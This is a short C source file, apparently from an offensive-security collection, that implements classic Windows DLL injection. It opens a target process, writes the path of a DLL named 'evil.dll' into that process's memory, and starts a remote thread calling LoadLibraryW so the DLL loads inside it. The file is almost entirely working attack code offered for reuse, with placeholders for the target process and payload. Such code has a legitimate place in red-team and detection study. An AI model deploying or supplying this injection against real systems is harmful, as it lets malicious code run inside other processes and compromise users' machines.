/*
Title: Classi DLL Injection
Resources:
    - https://www.ired.team/offensive-security/code-injection-process-injection/dll-injection
    - https://cocomelonc.github.io/tutorial/2021/09/20/malware-injection-2.html
*/

#include <Windows.h>

BOOL ClassicDllInjection() {
	DWORD dwPid = 1234; // Replace it with target process ID.
	WCHAR wDllPath[] = TEXT("C:\\evil.dll"); // Replace it with your own DLL to inject.

	HMODULE hKernel32 = GetModuleHandle(TEXT("Kernel32"));
	PVOID pLoadLibraryW = GetProcAddress(hKernel32, "LoadLibraryW");

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
	PVOID pRemoteAddr = VirtualAllocEx(hProcess, nullptr, sizeof(wDllPath), MEM_COMMIT, PAGE_READWRITE);
	WriteProcessMemory(hProcess, pRemoteAddr, (LPVOID)wDllPath, sizeof(wDllPath), nullptr);
	CreateRemoteThread(hProcess, nullptr, 0, (PTHREAD_START_ROUTINE)pLoadLibraryW, pRemoteAddr, 0, nullptr);

	CloseHandle(hProcess);

	return TRUE;
}